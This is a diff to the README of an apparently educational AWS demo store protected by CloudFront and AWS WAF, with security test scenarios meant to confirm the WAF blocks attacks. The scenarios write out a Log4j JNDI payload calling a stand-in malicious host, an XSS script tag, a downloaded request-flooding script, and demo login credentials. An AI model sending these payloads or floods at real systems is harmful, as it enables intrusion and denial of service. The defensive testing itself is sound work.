@@ -1,5 +1,5 @@
 # Fast & secure e-commerce demo
-This project is a fictitious online retail store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS Edge Services. It's an educational project, that helps developers in understanding the capabilities of AWS Edge Services. It can be used as a demo tool, and as a testing sandbox.
+This project is a fictitious online retail store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS edge services. It's an educational project, that helps developers in understanding the capabilities of these services. It can be used as a demo tool, and as a testing sandbox.
 
 > [!NOTE]
 > This demo serves as a reference or starting point for development purposes. Developers are responsible for thoroughly evaluating and modifying their code to ensure compliance with established security best practices and guidelines before deploying it in production.
@@ -8,7 +8,7 @@ This project is a fictitious online retail store that is accelerated by Amazon C
 
 ![](docs-images/screenshot.png) 
 
-In this page, you can find details on the architecture of the application, how to deploy it, and the different suggested test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS Edge Services.
+In this page, you can find details on the architecture of the application, how to deploy it, and the different suggested test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS edge services.
 
 
 
@@ -25,15 +25,15 @@ cdk deploy
 
 As prerequisite, you need to have CDK installed ```npm install -g aws-cdk``` and bootstraped ```cdk bootstrap```. 
 
-Note the generated CloudFront domain name, and the load balancer domain name, as you will use them in the test scenarios.
+Note the generated CloudFront domain name (_StoreInfraStack.CloudFrontDomainName_), and the load balancer domain name (_StoreInfraStack.ALBDomainName_), as you will use them in the test scenarios.
 
 # Architecture
 
 The backend of the application includes the following components:
 * A nextJS based SSR application hosted on EC2 instances behind an Application Load Balancer.
 * DynamoDB tables to store user and product information.
-* S3 buckets to store original and transformed images.
-* A Lamnda function that is responsible for transforming images.
+* S3 buckets to store original and transformed images such as product images.
+* A Lambda function that is responsible for transforming images.
 
 The backend is exposed to the internet through a CloudFront distribution and protected with AWS WAF. CloudFront Functions coupled with KeyValueStore, implement edge logic such as: A/B testing, redirections, image format detection, etc..
 
@@ -42,7 +42,7 @@ The backend is exposed to the internet through a CloudFront distribution and pro
 
 # Edge security test scenarios
 
-The following test scenarios cover different kind of threats that can be mitigated using AWS WAF. Replace the example CloudFront domain name (xxxxxxxx.cloudfront.net) in the scenarios with the actual one generated in the CDK deployment output. If you would like to dive into the WAF log record for a specific request, navigate in the AWS Console to the deployed WAF WebACL, and run the following query in CloudWatch insights tab using the request id:
+The following test scenarios cover different kind of threats that can be mitigated using AWS WAF. Replace the example CloudFront domain name (xxxxxxxx.cloudfront.net) in the scenarios with the actual one generated in the CDK deployment output. If you would like to dive into the WAF log record for a specific request, navigate in the AWS Console to the deployed WAF WebACL, and run the following query in CloudWatch insights tab using the request id corresponding to the request. This request id is sent in a response header, and if the page is blocked by AWS WAF, then it will also be shown in the blocked page payload.
 ```
 fields @timestamp, @message
 | sort @timestamp desc
@@ -52,10 +52,10 @@ fields @timestamp, @message
 
 | Test scenario | Threat category | How to test  | 
 |:------------- |:--------------- | :----------- |
-| Verify origin cloaking |**Protection bypass**| The Load balancer's security group is configured with CloudFront prefixlist, and the IP of the developer machine that deployed the CDK stack. On this developer machine, run the following curl command, and verify it works. Then go to Cloudshell in the AWS Console, and run the same command, and verify that the TCP connection was refused. <br/> ```curl -I http://xxxxxxxxx.xxxxx.elb.amazonaws.com```| 
-| Exploit Log4j CVE | **CVE exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
-| Post malicious XSS payload | **Cross site scripting** | Log in (user: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
-| Rate limit with 400 threshold | **Denial of Service (DoS)** | Go to Cloudshell in the AWS Console, and run the following commands, to start a DoS from a single IP. Verify that within seconds of serving a 404 Not found from the backend, WAF starts responding with a 202 javascript challenge, then simply blocking with 403 response code after around 20 seconds of when the 400 request throshold was breached. <br/> ```wget https://raw.githubusercontent.com/aws-samples/fast-secure-ecommerce-demo/main/scripts/rate-limit-test.sh``` <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 400```|
+| Verify origin cloaking |**Protection bypass**| The Load Balancer's security group is configured to allow access to the IP of the developer machine that deployed the CDK stack, and to allow access to CloudFront IPs, using the AWS Managed [prefix list for CloudFront](https://docs.aws.amazon.com/vpc/latest/userguide/working-with-aws-managed-prefix-lists.html). On the developer machine with the allowed IP, test the Load Balancer directly by running the following curl command, and verify it works. Then go to Cloudshell in the AWS Console, and run the same command, and verify that the TCP connection was refused. <br/> ```curl -I http://xxxxxxxxx.xxxxx.elb.amazonaws.com```. This technique for reducing the attack surface is known as [Origin Cloaking](https://aws.amazon.com/developer/application-security-performance/articles/origin-cloaking/)| 
+| Exploit Log4j CVE | **CVE exploit** | Load the following page with a malicious Log4j exploit payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
+| Post malicious XSS payload | **Cross site scripting** | Log in (user: Joud, pwd: demo), then load any product page to post the following comment with a malicious XSS payload. Verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
+| Rate limit | **Denial of Service (DoS)** | Go to Cloudshell in the AWS Console, and run the following commands, to start a DoS from a single IP. Verify that within seconds of serving a 404 Not found from the backend, the Bot Control rule in WAF starts responding with a 202 javascript challenge, then the rate limit starts blocking with 403 response code after around 20 seconds when the 80 requests rate limit threshold was breached. <br/> ```wget https://raw.githubusercontent.com/aws-samples/fast-secure-ecommerce-demo/main/scripts/rate-limit-test.sh``` <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 80```|
 | Malicious IPs | **Distributed Denial of Service (DDoS)** | To overcome rate limits, attackers can use a large number of IPs to launch DDoS attacks. AWS curates IP lists based on their reputation, and provide them as WAF Managed rules. In this example, we challenge requests coming from am proxy server IPs (VPNs, Tor, etc..) with a CAPTCHA. To test it, load the homepage using a proxy website (e.g. https://www.blockaway.net), and verify that the page is challenged with a CAPTCHA. Note that this test might not succeed everytime, since proxy operators constantly evolve their IPs.|
 | Allow social media bots | **Inadvertly block desired bots** | Paste the home page link in one of the solial network (e.g. Linkedin) and verify that a preview has been correcrtly showed |
 | User-Agent classification | **Web scraping using HTTP libraries** | Go to Cloudshell in the AWS Console, and run the following ```curl``` command. Verify that WAF detects this HTTP library and blocks the request: <br/> ```curl -I https://xxxxxxxx.cloudfront.net/```|
